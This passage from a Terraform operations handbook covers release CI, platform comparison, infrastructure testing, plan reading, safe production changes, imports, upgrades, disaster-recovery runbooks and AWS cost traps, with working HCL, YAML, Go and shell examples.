        with: { terraform_version: "1.16.4", terraform_wrapper: false }
      - run: terraform init -backend=false
      - run: terraform fmt -check -recursive
      - run: terraform validate
      - uses: terraform-linters/setup-tflint@v5
      - run: tflint --init && tflint
      - name: terraform test
        run: terraform test
      - name: Check terraform-docs is current
        run: |
          curl -sSL https://terraform-docs.io/dl/v0.19.0/terraform-docs-v0.19.0-linux-amd64.tar.gz | tar xz
          ./terraform-docs .
          git diff --exit-code README.md || {
            echo "::error::README.md is out of date — run terraform-docs and commit"
            exit 1
          }

  release:
    needs: validate
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v5
        with: { fetch-depth: 0 }

      - name: Generate the changelog
        id: changelog
        run: |
          set -euo pipefail
          PREV="$(git describe --tags --abbrev=0 "${GITHUB_REF_NAME}^" 2>/dev/null || true)"
          D="$(openssl rand -hex 12)"
          {
            echo "notes<<$D"
            echo "## Changes"
            echo ""
            git log --pretty='- %s (%h)' "${PREV:+$PREV..}${GITHUB_REF_NAME}"
            echo ""
            [ -n "$PREV" ] && echo "**Full diff**: ${{ github.server_url }}/${{ github.repository }}/compare/${PREV}...${GITHUB_REF_NAME}"
            echo "$D"
          } >> "$GITHUB_OUTPUT"

      - uses: softprops/action-gh-release@v3
        with:
          body: ${{ steps.changelog.outputs.notes }}
          generate_release_notes: true

      # Move the major tag so consumers on ?ref=v3 get the update
      - name: Move the major tag
        run: |
          set -euo pipefail
          TAG="${GITHUB_REF_NAME}"          # v3.2.1
          MAJOR="${TAG%%.*}"                # v3
          git config user.name  'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git tag -fa "$MAJOR" -m "Update $MAJOR to $TAG"
          git push origin "$MAJOR" --force
```

⚠️ **Moving a major tag is a mutable reference.** It is convenient for internal modules where you control both sides. For anything security-relevant, consumers should pin the full SHA and let Dependabot bump it.

---

## Chapter 52 — Self-Managed vs HCP Terraform vs Atlantis vs Spacelift

| | Self-managed GitHub Actions | HCP Terraform | Atlantis | Spacelift / env0 / Scalr |
|---|---|---|---|---|
| Where runs execute | Your Actions runners | HashiCorp's infrastructure (or your agents) | Your server | Vendor's (or your workers) |
| State management | You (S3/GCS) | Managed | You | Managed or yours |
| Cost | 💰 Actions minutes only | 💰 Per-resource pricing — grows with your infrastructure | 💰 One small server | 💰 Per-user or per-run |
| PR workflow | You build it (Chapter 47) | Built in | Built in, comment-driven | Built in |
| Policy engine | OPA/Conftest (you wire it) | Sentinel or OPA, integrated | You wire it | Integrated OPA |
| Private module registry | Git tags | ✅ Built in | Git tags | ✅ Built in |
| Drift detection | You build it (Chapter 49) | ✅ Built in | Community | ✅ Built in |
| RBAC | GitHub teams + environments | ✅ Fine-grained workspaces | GitHub | ✅ Fine-grained |
| Secrets stay in your perimeter | ✅ Yes | ⚠️ Variables stored by vendor | ✅ Yes | ⚠️ Depends on config |
| Stacks support | ❌ | ✅ Only place it exists | ❌ | ❌ |
| Operational burden | ⚠️ You maintain the pipeline | ✅ None | ⚠️ You run a server | ✅ Low |
| Lock-in | ✅ None | ⚠️ Moderate-high | ✅ None | ⚠️ Moderate |

**Recommendation by team size:**

| Team | Choice |
|---|---|
| 1–10 engineers, <20 stacks | **Self-managed GitHub Actions.** Free, transferable skills, no lock-in |
| 10–40, want less pipeline maintenance | Spacelift or env0. Better value than HCP at this size |
| Large enterprise, already HashiCorp customer | HCP Terraform / TFE. Sentinel and Stacks are genuinely differentiated |
| Strong preference for self-hosting, PR-comment workflow | Atlantis |

💰 **The HCP pricing caveat:** per-resource-under-management pricing means your bill grows with your infrastructure, not with your team. A large but simple infrastructure (thousands of DNS records, say) can produce a surprising invoice. Model it before committing.

---
# Part IX — Testing and Quality

---

## Chapter 53 — The Testing Pyramid for Infrastructure

```mermaid
flowchart TD
    subgraph P["What to run, and where"]
        A["terraform fmt · validate<br/>seconds · pre-commit + PR"] --> B["tflint<br/>seconds · pre-commit + PR"]
        B --> C["Checkov / Trivy on the plan<br/>~30s · PR"]
        C --> D["Conftest / OPA on the plan<br/>~5s · PR"]
        D --> E["terraform test — plan mode<br/>~30s · PR · no real resources"]
        E --> F["terraform test — apply mode<br/>minutes · 💰 creates real resources · PR or nightly"]
        F --> G["Terratest<br/>minutes to hours · 💰 · nightly"]
        G --> H["Ephemeral environment E2E<br/>hours · 💰💰 · nightly or pre-release"]
    end
```

🧠 **Infrastructure testing has an unusual property: the expensive tests cost actual money, not just time.** A `terraform test` in apply mode creates real cloud resources. This changes the economics — you genuinely cannot run everything on every PR.

### 53.1 What to test, and what not to

| Test this | Do not test this |
|---|---|
| Your module's **logic** — does `for_each` produce the right set? | That AWS creates an S3 bucket when you ask for one |
| **Conditional behaviour** — does `enable_x = false` omit the resource? | That the provider works |
| **Variable validation** — do bad inputs fail with a clear message? | That Terraform's own functions work |
| **Computed values** — is the name prefix assembled correctly? | Cloud provider SLAs |
| **Policy compliance** — does the module produce an encrypted bucket by default? | Third-party module internals (test *your usage* of them) |
| **Integration** — does the created service actually respond? | |

**Recommendation:** every module gets `fmt`, `validate`, `tflint` and at least one plan-mode `terraform test` verifying its defaults. Apply-mode tests for the modules that matter most, run nightly, not per PR.

---

## Chapter 54 — `terraform test`

🔬 Terraform 1.6+ / OpenTofu 1.6+. Mocks and overrides: 1.7+.

### 54.1 Plan-mode tests — fast, free, no real resources

```hcl
# modules/ecs-service/tests/defaults.tftest.hcl

variables {
  name        = "testsvc"
  environment = "dev"
  cluster_arn = "arn:aws:ecs:ap-south-1:123456789012:cluster/test"
  vpc_id      = "vpc-12345678"
  subnet_ids  = ["subnet-11111111", "subnet-22222222"]
  image       = "123456789012.dkr.ecr.ap-south-1.amazonaws.com/api:abc123"
}

# Mock the provider so nothing real is contacted
mock_provider "aws" {
  mock_data "aws_caller_identity" {
    defaults = {
      account_id = "123456789012"
      arn        = "arn:aws:iam::123456789012:role/test"
    }
  }
}

run "defaults_are_production_safe" {
  command = plan

  assert {
    condition     = aws_ecs_task_definition.this.network_mode == "awsvpc"
    error_message = "Fargate requires awsvpc network mode"
  }

  assert {
    condition     = aws_ecs_service.this.network_configuration[0].assign_public_ip == false
    error_message = "Tasks must not have public IPs"
  }

  assert {
    condition     = aws_cloudwatch_log_group.this.retention_in_days > 0
    error_message = "Log retention must be set, otherwise logs are kept forever and cost money"
  }

  assert {
    condition     = aws_ecs_service.this.deployment_circuit_breaker[0].rollback == true
    error_message = "Automatic rollback must be enabled"
  }
}

run "naming_is_correct" {
  command = plan

  assert {
    condition     = startswith(aws_iam_role.task.name, "testsvc")
    error_message = "Task role name must be prefixed with the service name"
  }
}

run "secrets_use_arn_references_not_values" {
  command = plan

  variables {
    secrets = {
      DB_PASSWORD = "arn:aws:secretsmanager:ap-south-1:123456789012:secret:test-AbCdEf"
    }
  }

  assert {
    condition = length([
      for c in jsondecode(aws_ecs_task_definition.this.container_definitions)[0].secrets :
      c if c.name == "DB_PASSWORD"
    ]) == 1
    error_message = "Secrets must be injected via the 'secrets' block, not 'environment'"
  }
}

run "autoscaling_is_omitted_when_null" {
  command = plan

  variables {
    autoscaling = null
  }

  assert {
    condition     = length(aws_appautoscaling_target.this) == 0
    error_message = "Autoscaling resources must not be created when autoscaling is null"
  }
}
```

### 54.2 Testing validation failures

```hcl
# modules/ecs-service/tests/validation.tftest.hcl

run "rejects_single_subnet" {
  command = plan

  variables {
    name        = "testsvc"
    environment = "dev"
    cluster_arn = "arn:aws:ecs:ap-south-1:123456789012:cluster/test"
    vpc_id      = "vpc-12345678"
    subnet_ids  = ["subnet-11111111"]      # only one
    image       = "nginx:latest"
  }

  expect_failures = [
    var.subnet_ids,
  ]
}

run "rejects_invalid_environment" {
  command = plan

  variables {
    name        = "testsvc"
    environment = "prod"                   # must be "production"
    cluster_arn = "arn:aws:ecs:ap-south-1:123456789012:cluster/test"
    vpc_id      = "vpc-12345678"
    subnet_ids  = ["subnet-1", "subnet-2"]
    image       = "nginx:latest"
  }

  expect_failures = [
    var.environment,
  ]
}
```

🧠 **`expect_failures` is the feature that makes validation worth writing.** Without it you can only assert that valid inputs work; with it you can prove that invalid inputs are rejected — which is the actual contract of your module.

### 54.3 Apply-mode tests — real resources, real cost

```hcl
# modules/s3-bucket/tests/integration.tftest.hcl

variables {
  bucket_name = "acme-tftest-${run.setup.random_suffix}"
}

run "setup" {
  module { source = "./tests/setup" }      # generates a random suffix
}

run "creates_a_secure_bucket" {
  command = apply                           # ⚠️ 💰 creates a real bucket

  assert {
    condition     = aws_s3_bucket_versioning.this.versioning_configuration[0].status == "Enabled"
    error_message = "Versioning must be enabled"
  }

  assert {
    condition     = aws_s3_bucket_public_access_block.this.block_public_acls == true
    error_message = "Public ACLs must be blocked"
  }
}

run "bucket_actually_rejects_public_access" {
  command = apply

  module { source = "./tests/verify" }      # a helper module that makes a real HTTP call

  assert {
    condition     = data.http.public_probe.status_code == 403
    error_message = "The bucket responded to an unauthenticated request"
  }
}
```

Terraform destroys everything an apply-mode test created when the test file finishes, in reverse order.

⚠️ **Apply-mode tests need real credentials and cost real money.** Run them in a dedicated sandbox account, on a schedule rather than per PR, and give the sandbox a hard budget alarm.

### 54.4 Running them

```bash
terraform test                          # all *.tftest.hcl in tests/
terraform test -filter=defaults.tftest.hcl
terraform test -verbose                 # show the plan for each run block
terraform test -var-file=test.tfvars
```

```yaml
# In CI
- name: terraform test
  run: terraform test -no-color
  working-directory: modules/${{ matrix.module }}
```

---

## Chapter 55 — Terratest and Policy Tests

### 55.1 When Terratest earns its place

`terraform test` cannot: make arbitrary API calls, poll until a condition holds, test failure and recovery, or express complex multi-stage scenarios. Terratest (Go) can.

```go
// test/ecs_service_test.go
package test

import (
	"fmt"
	"testing"
	"time"

	"github.com/gruntwork-io/terratest/modules/aws"
	"github.com/gruntwork-io/terratest/modules/http-helper"
	"github.com/gruntwork-io/terratest/modules/random"
	"github.com/gruntwork-io/terratest/modules/terraform"
	"github.com/stretchr/testify/assert"
)

func TestEcsServiceServesTraffic(t *testing.T) {
	t.Parallel()

	region := "ap-south-1"
	name := fmt.Sprintf("tt-%s", random.UniqueId())

	opts := terraform.WithDefaultRetryableErrors(t, &terraform.Options{
		TerraformDir: "../examples/complete",
		Vars: map[string]interface{}{
			"name":        name,
			"environment": "dev",
			"aws_region":  region,
		},
		EnvVars: map[string]string{"AWS_DEFAULT_REGION": region},
	})

	defer terraform.Destroy(t, opts)
	terraform.InitAndApply(t, opts)

	url := terraform.Output(t, opts, "service_url")

	// Poll until the service is actually serving, not just "created"
	http_helper.HttpGetWithRetry(t, url+"/actuator/health", nil, 200, `{"status":"UP"}`, 30, 10*time.Second)

	// Verify a security property against the real API, not the plan
	sgID := terraform.Output(t, opts, "security_group_id")
	sg := aws.GetSecurityGroupById(t, sgID, region)
	for _, rule := range sg.IpPermissions {
		for _, r := range rule.IpRanges {
			assert.NotEqual(t, "0.0.0.0/0", *r.CidrIp,
				"Service security group must not allow ingress from the world")
		}
	}
}
```

⚠️ Terratest creates real infrastructure and is slow (10–40 minutes typical). **Recommendation:** nightly, in a sandbox account, for your three or four most critical modules. Not on every PR.

🔬 Terratest reached **v1.0 in May 2026** and now follows semantic versioning — a meaningful improvement in stability guarantees over the long 0.x era.

### 55.2 Policy tests

Your Rego policies are code and deserve tests:

```rego
# policies/terraform/production_test.rego
package terraform.production

test_denies_unencrypted_rds if {
  deny["aws_db_instance.main: storage_encrypted must be true"] with input as {
    "resource_changes": [{
      "address": "aws_db_instance.main",
      "type": "aws_db_instance",
      "change": {"actions": ["create"], "after": {"storage_encrypted": false}}
    }]
  }
}

test_allows_encrypted_rds if {
  count(deny) == 0 with input as {
    "resource_changes": [{
      "address": "aws_db_instance.main",
      "type": "aws_db_instance",
      "change": {"actions": ["create"], "after": {
        "storage_encrypted": true,
        "publicly_accessible": false,
        "deletion_protection": true
      }}
    }],
    "variables": {"environment": {"value": "production"}}
  }
}
```

```bash
conftest verify --policy policies/
```

---

## Chapter 56 — Pre-commit, and What Not to Test

### 56.1 Pre-commit hooks

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/antonbabenko/pre-commit-terraform
    rev: v1.96.3
    hooks:
      - id: terraform_fmt
      - id: terraform_validate
        args: ['--hook-config=--retry-once-with-cleanup=true']
      - id: terraform_tflint
        args: ['--args=--config=__GIT_WORKING_DIR__/.tflint.hcl']
      - id: terraform_docs
        args: ['--hook-config=--path-to-file=README.md', '--hook-config=--add-to-existing-file=true']
      - id: terraform_checkov
        args: ['--args=--quiet', '--args=--compact', '--args=--framework=terraform']
      - id: terraform_trivy
        args: ['--args=--severity=HIGH,CRITICAL']

  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v5.0.0
    hooks:
      - id: end-of-file-fixer
      - id: trailing-whitespace
      - id: check-merge-conflict
      - id: detect-private-key
      - id: check-yaml

  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.21.2
    hooks:
      - id: gitleaks
```

```bash
pre-commit install
pre-commit run --all-files
```

🧠 **Pre-commit is about latency, not enforcement.** It gives a developer feedback in two seconds instead of four minutes. It is trivially bypassed with `--no-verify`, so **CI must run the same checks**. Never treat pre-commit as a control.

### 56.2 Things not worth testing

- **That the provider creates what you asked for.** That is the provider's test suite.
- **Every attribute of every resource.** Test the ones that encode a decision or a policy.
- **Third-party module internals.** Test that *your usage* produces what you expect.
- **Static values.** Asserting `aws_s3_bucket.this.bucket == "my-bucket"` when you literally set `bucket = "my-bucket"` proves nothing.

---

# Part X — Operations

---

## Chapter 57 — Reading a Plan Like a Senior Engineer

### 57.1 Every symbol

| Symbol | Meaning |
|---|---|
| `+` | create |
| `-` | destroy |
| `~` | update in place |
| `-/+` | **destroy then create** (replacement) |
| `+/-` | **create then destroy** (replacement with `create_before_destroy`) |
| `<=` | read a data source during apply |
| `#` | a comment from Terraform, e.g. `# forces replacement` |
| `(known after apply)` | Terraform cannot predict the value |
| `# (5 unchanged attributes hidden)` | use `-json` or expand in the UI to see them |
| `# aws_x.y has moved to aws_x.z` | a `moved` block took effect |
| `# aws_x.y will be imported` | an `import` block |
| `# forces replacement` | **the attribute that caused `-/+`** |

### 57.2 The four-pass reading method

```mermaid
flowchart TD
    A["A plan appears"] --> B["Pass 1: read the LAST LINE<br/>'Plan: N to add, M to change, K to destroy'"]
    B --> C{"K > 0 or any replacement?"}
    C -->|"yes"| D["⚠️ Pass 2: find every<br/>'must be replaced' and<br/>'will be destroyed'.<br/>Name each one out loud."]
    C -->|"no"| E["Pass 2: scan the '~' changes"]
    D --> F["Pass 3: for each replacement,<br/>find the '# forces replacement'<br/>comment. Was that change intended?"]
    E --> F
    F --> G["Pass 4: check for surprises —<br/>resources you did not expect<br/>to appear in this plan at all"]
    G --> H{"Everything explained?"}
    H -->|"no"| I["🔴 DO NOT APPLY.<br/>Find out why first."]
    H -->|"yes"| J["✅ Approve"]
```

### 57.3 Worked example: the plan that would have deleted production

```
  # aws_db_instance.main must be replaced
-/+ resource "aws_db_instance" "main" {
      ~ address                      = "prod-api-db.abc.ap-south-1.rds.amazonaws.com" -> (known after apply)
      ~ arn                          = "arn:aws:rds:ap-south-1:123456789012:db:prod-api-db" -> (known after apply)
        allocated_storage            = 200
      ~ availability_zone            = "ap-south-1a" -> "ap-south-1b" # forces replacement
      ~ endpoint                     = "prod-api-db.abc.ap-south-1.rds.amazonaws.com:5432" -> (known after apply)
        engine                       = "postgres"
        engine_version               = "17.2"
      ~ id                           = "prod-api-db" -> (known after apply)
        instance_class               = "db.r6g.xlarge"
        multi_az                     = false
        # (42 unchanged attributes hidden)
    }

Plan: 1 to add, 0 to change, 1 to destroy.
```

**What this actually means:** someone changed `availability_zone` — perhaps to "rebalance" — and on a single-AZ RDS instance that attribute is `ForceNew`. Applying this **deletes the production database and creates an empty one**. The `endpoint` changing to `(known after apply)` is the clue that every application connection string breaks.

**What should have stopped it:**
1. `lifecycle { prevent_destroy = true }` — the plan would have errored.
2. `deletion_protection = true` — the API would have refused.
3. The PR comment summary showing `Replace: 1` with `aws_db_instance.main` named.
4. A Conftest policy denying replacement of stateful resources in production.
5. A reviewer reading the last line.

### 57.4 What forces replacement — a reference

| Resource | Attributes that force replacement |
|---|---|
| `aws_db_instance` | `identifier`, `engine`, `db_name`, `availability_zone` (single-AZ), `db_subnet_group_name`, `character_set_name` |
| `aws_rds_cluster` | `cluster_identifier`, `engine`, `database_name`, `master_username` |
| `aws_instance` | `ami`, `availability_zone`, `subnet_id`, `user_data` (unless `user_data_replace_on_change = false`) |
| `aws_subnet` | `cidr_block`, `vpc_id`, `availability_zone` |
| `aws_vpc` | `cidr_block`, `instance_tenancy` |
| `aws_ecs_task_definition` | `family` |
| `aws_lb` | `name`, `subnets` (for NLB), `internal`, `load_balancer_type` |
| `aws_lb_target_group` | `name`, `port`, `protocol`, `vpc_id`, `target_type` |
| `aws_s3_bucket` | `bucket` |
| `aws_elasticache_replication_group` | `replication_group_id`, `engine`, `subnet_group_name` |
| `google_sql_database_instance` | `name`, `database_version` (downgrade), `region` |
| `google_container_cluster` | `name`, `location`, `network`, `ip_allocation_policy` |

⚠️ **There is no universal way to know from the HCL whether an attribute is `ForceNew`.** You must read the provider documentation or read the plan. This is why reading plans is a skill, not a formality.

### 57.5 Machine-readable plan analysis

```bash
terraform show -json tfplan > plan.json

# Everything being destroyed
jq -r '.resource_changes[] | select(.change.actions | contains(["delete"])) | .address' plan.json

# Everything being replaced
jq -r '.resource_changes[] | select(.change.actions == ["delete","create"] or .change.actions == ["create","delete"]) | .address' plan.json

# Stateful resources being touched at all
jq -r '.resource_changes[]
  | select(.type | test("aws_db_instance|aws_rds_cluster|aws_s3_bucket|aws_elasticache|aws_kms_key"))
  | select(.change.actions != ["no-op"])
  | "\(.change.actions | join(",")): \(.address)"' plan.json

# A compact change summary
jq -r '.resource_changes[] | select(.change.actions != ["no-op"]) | "\(.change.actions|join("/")) \(.address)"' plan.json | sort | uniq -c
```

---

## Chapter 58 — Safe Production Changes

### 58.1 The two-step PR pattern

For anything risky, split it into two merges:

```mermaid
flowchart LR
    A["PR 1: ADD the new thing<br/>alongside the old.<br/>Both exist. Zero destroys."] --> B["Apply. Verify the new thing works."]
    B --> C["PR 2: REMOVE the old thing.<br/>Traffic already moved."]
    C --> D["Apply. Clean up."]
```

Examples where this is the right approach:

| Change | Step 1 | Step 2 |
|---|---|---|
| Move to a new subnet CIDR | Create the new subnets | Move resources, then delete the old subnets |
| Rename a security group | Create the new one, attach it alongside | Detach and delete the old |
| Change an RDS instance class in a way that would replace | Create a read replica of the right class, promote it | Delete the original |
| Change a certificate's SANs | `create_before_destroy` handles it | — |
| Replace a load balancer | Create the new ALB, add a weighted DNS record | Shift weight to 100%, delete the old |

### 58.2 Databases

```hcl
resource "aws_db_instance" "main" {
  # Layer 1 — Terraform refuses to plan a destroy
  lifecycle {
    prevent_destroy = true
  }

  # Layer 2 — the AWS API refuses to delete
  deletion_protection = true

  # Layer 3 — if it is deleted anyway, a snapshot survives
  skip_final_snapshot       = false
  final_snapshot_identifier = "${local.name_prefix}-final-${formatdate("YYYYMMDDhhmmss", timestamp())}"

  # Layer 4 — point-in-time recovery
  backup_retention_period  = 30
  delete_automated_backups = false
  copy_tags_to_snapshot    = true

  # Layer 5 — disruptive changes wait for the maintenance window
  apply_immediately = false
}
```

⚠️ **Major version upgrades are one-way.** `engine_version = "16.3" -> "17.2"` cannot be rolled back. The procedure:

1. Snapshot manually.
2. Restore the snapshot into a new instance and test the upgrade there.
3. Check `aws rds describe-db-engine-versions` for the valid upgrade path.
4. Set `allow_major_version_upgrade = true` **and** `apply_immediately = false`.
5. Apply. It happens in the maintenance window.
6. Remove `allow_major_version_upgrade` afterwards so it cannot happen accidentally again.

### 58.3 Networking

⚠️ **The rule: you cannot change subnet CIDRs. Plan generously at the start.**

Things that look harmless and are not:

| Change | What actually happens |
|---|---|
| Subnet `cidr_block` | Subnet replaced → every ENI in it destroyed → RDS, ECS tasks, ALB destroyed |
| Removing a subnet from an ALB | Brief capacity loss; on NLB it forces replacement |
| Changing a security group's `name` | Replacement; brief window where rules do not apply |
| Changing a route table association | Momentary loss of routing |
| Deleting a NAT gateway | All outbound traffic from that AZ stops immediately |

### 58.4 IAM

⚠️ IAM is **eventually consistent**. A role created and immediately used can fail with `AccessDenied` for several seconds.

```hcl
resource "aws_ecs_service" "this" {
  depends_on = [
    aws_iam_role_policy_attachment.execution_managed,
    aws_iam_role_policy.task,
  ]
}
```

And for policy changes, the safe pattern is: add the new permission, deploy, verify, then remove the old — never swap in one step.

### 58.5 DNS and certificates

⚠️ DNS changes are delayed by TTL. Before a cutover:

1. **Lower the TTL to 60 seconds and apply.** Wait for the old TTL to expire.
2. Make the change.
3. Verify.
4. Raise the TTL back.

For certificates, `create_before_destroy = true` on `aws_acm_certificate` is mandatory (Chapter 34.1).

### 58.6 Change windows and staged rollout

```yaml
# Refuse to apply to production outside the change window
- name: Check the change window
  if: steps.env.outputs.name == 'production' && github.event_name != 'workflow_dispatch'
  run: |
    HOUR=$(date -u +%H)
    DAY=$(date -u +%u)
    if [ "$DAY" -gt 5 ]; then
      echo "::error::No production applies at weekends. Use workflow_dispatch with a documented reason."
      exit 1
    fi
    if [ "$HOUR" -lt 4 ] || [ "$HOUR" -gt 11 ]; then
      echo "::error::Production applies are restricted to 04:00-11:00 UTC (09:30-16:30 IST)."
      exit 1
    fi
```

**Recommendation:** dev → staging → production, always, with a soak period. A `max-parallel: 1` matrix in stack order gives you this for free.

---

## Chapter 59 — Refactoring Without Destroying

Covered mechanically in Chapter 16. The operational workflow:

```mermaid
flowchart TD
    A["I want to rename / restructure"] --> B["1. Make the config change<br/>AND add the moved block<br/>in the SAME commit"]
    B --> C["2. terraform plan"]
    C --> D{"Plan shows<br/>0 to add, 0 to destroy?"}
    D -->|"no"| E["⚠️ The moved block is wrong.<br/>Check the exact addresses<br/>with terraform state list"]
    E --> B
    D -->|"yes"| F["3. Open the PR. The plan comment<br/>proves it is a no-op."]
    F --> G["4. Merge and apply"]
    G --> H["5. Optionally delete the moved block<br/>in a later PR, once every<br/>workspace has applied"]
```

⚠️ **Never do the config change and the moved block in separate commits.** Between them, `main` contains a configuration that plans a destroy-and-create. If anyone applies at that moment, you lose the resource.

### 59.1 The address-lookup trick

```bash
terraform state list | grep -i database
# module.data.aws_db_instance.postgres

# Now the moved block writes itself
```

### 59.2 Refactoring across a state boundary

`moved` blocks cannot cross state files. Use the import/removed pattern from Chapter 22.4.

---

## Chapter 60 — Import Strategies

### 60.1 The workflow

```mermaid
flowchart TD
    A["Existing infrastructure<br/>created by hand"] --> B["1. Inventory it<br/>aws resourcegroupstaggingapi get-resources<br/>or the console"]
    B --> C["2. Write import blocks<br/>with empty resource blocks"]
    C --> D["3. terraform plan -generate-config-out=gen.tf"]
    D --> E["⚠️ 4. HEAVILY EDIT gen.tf<br/>Output is experimental: every optional<br/>attribute written out, no variables,<br/>no modules, sometimes invalid"]
    E --> F["5. terraform plan"]
    F --> G{"Shows only imports,<br/>no creates or destroys?"}
    G -->|"no"| H["Adjust the config until<br/>it matches reality"]
    H --> F
    G -->|"yes"| I["6. terraform apply"]
    I --> J["7. Refactor into modules<br/>with moved blocks"]
```

### 60.2 A worked example

```hcl
# imports.tf — temporary, deleted after the import lands
import {
  to = aws_vpc.main
  id = "vpc-0a1b2c3d4e5f67890"
}

import {
  for_each = {
    "ap-south-1a" = "subnet-0aaa"
    "ap-south-1b" = "subnet-0bbb"
    "ap-south-1c" = "subnet-0ccc"
  }
  to = aws_subnet.private[each.key]
  id = each.value
}

import {
  to = aws_db_instance.main
  id = "prod-api-db"
}
```

```bash
terraform plan -generate-config-out=generated.tf
```

⚠️ **The generated config is a draft.** Expect to spend real time: replacing literals with variables, removing attributes the provider computed, splitting into modules, adding `lifecycle` blocks.

### 60.3 Import IDs are not uniform

Each resource type has its own import ID format, documented at the bottom of its provider page:

| Resource | Import ID |
|---|---|
| `aws_vpc` | `vpc-0a1b2c3d` |
| `aws_s3_bucket` | `bucket-name` |
| `aws_db_instance` | the identifier, e.g. `prod-api-db` |
| `aws_iam_role` | the role name |
| `aws_iam_role_policy_attachment` | `role-name/policy-arn` |
| `aws_security_group_rule` (legacy) | `sg-id_ingress_tcp_443_443_0.0.0.0/0` |
| `aws_lb_listener_rule` | the rule ARN |
| `aws_ecs_service` | `cluster-name/service-name` |
| `google_sql_database_instance` | `projects/PROJECT/instances/NAME` |
| `google_container_cluster` | `projects/PROJECT/locations/REGION/clusters/NAME` |

### 60.4 Bulk import at scale

For hundreds of resources, generate the import blocks:

```bash
aws ec2 describe-subnets \
  --filters "Name=vpc-id,Values=vpc-0a1b2c3d" \
  --query 'Subnets[].{id:SubnetId,az:AvailabilityZone}' --output json \
  | jq -r '.[] | "import {\n  to = aws_subnet.private[\"\(.az)\"]\n  id = \"\(.id)\"\n}\n"' \
  >> imports.tf
```

Tools worth knowing: **Terraformer** (generates both config and state from live infrastructure) and **former2** (AWS, browser-based). Both produce output that needs the same heavy editing.

---

## Chapter 61 — Terraform and Provider Upgrades

### 61.1 The upgrade order

```mermaid
flowchart LR
    A["1. Read the upgrade guide<br/>and CHANGELOG"] --> B["2. Bump in DEV first"]
    B --> C["3. terraform init -upgrade"]
    C --> D["4. terraform plan<br/>⚠️ Expect a non-empty plan"]
    D --> E{"Plan shows only<br/>expected changes?"}
    E -->|"no"| F["Investigate. Provider majors<br/>often change defaults."]
    F --> D
    E -->|"yes"| G["5. Apply in dev. Soak."]
    G --> H["6. Repeat in staging"]
    H --> I["7. Production, in a change window"]
    I --> J["8. Commit the updated<br/>.terraform.lock.hcl"]
```

### 61.2 Terraform CLI upgrades

⚠️ **State format is forward-only.** Once 1.16 writes your state, 1.15 cannot read it. Upgrade the CI runner and every engineer's machine together, coordinated via `.terraform-version`.

```bash
echo "1.16.4" > .terraform-version
# Commit. Everyone running tenv picks it up automatically.
```

### 61.3 Provider major upgrades

```bash
terraform init -upgrade
terraform plan
```

A non-empty plan after a provider upgrade is normal and expected — new default values, renamed attributes, changed computed behaviour. **Read every line.** The dangerous ones are replacements.

The AWS provider v6 changes (Chapter 9.4) are a good illustration: `aws_ami` with `most_recent` now errors without `owners`, which broke many configurations — correctly, since it closed a real supply-chain hole.

### 61.4 An upgrade PR template

```markdown
## Provider upgrade: aws 6.60 → 6.66

### Upgrade guide reviewed
- [ ] Read the provider CHANGELOG for every intermediate version
- [ ] Read the official upgrade guide, if a major bump

### Plan results
| Stack | Add | Change | Destroy | Replace |
|---|---|---|---|---|
| foundation/dev | 0 | 2 | 0 | 0 |
| data/dev | 0 | 0 | 0 | 0 |
| apps/api/dev | 0 | 1 | 0 | 0 |

### Changes explained
- `aws_ecs_service.this`: new `availability_zone_rebalancing` attribute defaults to "ENABLED"

### Rollout
- [x] dev applied, soaked 24h
- [ ] staging
- [ ] production (change window: Tue 05:00 UTC)
```

---

## Chapter 62 — Drift Handling and Disaster Recovery

Detection is Chapter 49. Response is Chapter 21.3. The remaining piece is the runbook.

### 62.1 The incident runbook

```markdown
# Runbook: Terraform incident

## 1. Stop the bleeding
- Disable the apply workflow: Actions → terraform-apply → "..." → Disable workflow
- Announce in #infrastructure

## 2. Identify the state
- Which stack? Which state key?
- `terraform state pull > /tmp/current.tfstate` — TAKE A BACKUP BEFORE ANYTHING ELSE

## 3. Classify
| Symptom | Go to |
|---|---|
| Plan wants to create everything | State lost — §23.1 |
| "Failed to load state" | State corrupted — §23.2 |
| Apply failed partway | §23.3 |
| Resources exist that state does not know | Split-brain — §23.4 |
| Things were destroyed | §23.5 |
| Lock will not release | §19.3 |

## 4. Recover
Follow the relevant section. Never hand-edit state.

## 5. Verify
`terraform plan` must show only the changes you expect.

## 6. Re-enable and write it up
- Re-enable the workflow
- Post-incident: what control would have prevented this? Add it.
```

### 62.2 Backups beyond S3 versioning

```yaml
# .github/workflows/state-backup.yml
name: State backup
on:
  schedule: [{ cron: '0 1 * * *' }]
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

jobs:
  backup:
    runs-on: ubuntu-24.04
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/terraform-plan
          aws-region: ap-south-1
      - name: Copy state to the backup bucket in another region
        run: |
          aws s3 sync \
            "s3://acme-tfstate-${{ vars.AWS_ACCOUNT_ID }}/" \
            "s3://acme-tfstate-backup-${{ vars.AWS_ACCOUNT_ID }}/$(date -u +%Y-%m-%d)/" \
            --source-region ap-south-1 --region ap-southeast-1
```

⚠️ The backup bucket is now a second copy of every secret in your state. Encrypt it, lock it down, and apply the same access discipline.

---

## Chapter 63 — Cost Management

### 63.1 Infracost in the PR

Wired into Chapter 47. The PR comment shows the monthly cost delta before merge, which changes behaviour more than any retrospective dashboard.

```yaml
- name: Infracost diff against main
  run: |
    infracost breakdown --path plan.json --format json --out-file current.json
    infracost diff --path current.json --compare-to baseline.json \
      --format github-comment --out-file infracost.md
```

### 63.2 💰 The AWS cost traps in Terraform-managed infrastructure

| Trap | Typical monthly cost | Fix |
|---|---|---|
| NAT gateway per AZ | ~$97 + data processing | VPC endpoints; single NAT in non-prod |
| NAT data processing | $0.045/GB **each way** | S3/ECR gateway endpoints |
| Unattached EBS volumes | $0.08/GB | Lifecycle cleanup, `delete_on_termination` |
| Unassociated Elastic IPs | ~$3.60 each | A scheduled audit |
| CloudWatch logs with no retention | Unbounded | **Always set `retention_in_days`** |
| Interface VPC endpoints | ~$7.20/month × AZs each | Only add when NAT data exceeds the cost |
| Idle RDS in dev | $50–500 | Stop non-prod outside hours |
| Fargate on-demand in dev | 3× spot | `FARGATE_SPOT` for non-prod |
